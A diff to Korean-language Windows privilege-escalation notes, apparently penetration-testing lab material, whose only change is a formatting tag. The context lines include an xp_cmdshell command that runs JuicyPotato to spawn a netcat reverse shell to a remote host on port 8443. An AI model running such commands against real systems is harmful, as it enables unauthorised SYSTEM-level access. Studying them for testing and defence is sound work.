@@ -176,7 +176,7 @@ PowerShell : ```Get-WmiObject -Class Win32_Product |  select Name, Version```
 ```xp_cmdshell whoami /priv```
 
 ### JuicyPotato를 사용한 권한 상승
-- [JuicyPotato](https://github.com/ohpe/juicy-potato)는 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한을 악용하는 데 사용
+- [JuicyPotato](https://github.com/ohpe/juicy-potato)는 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한을 악용하는 데 사용<br/>
 ```xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *```
 
 ### SYSTEM Shell 잡기
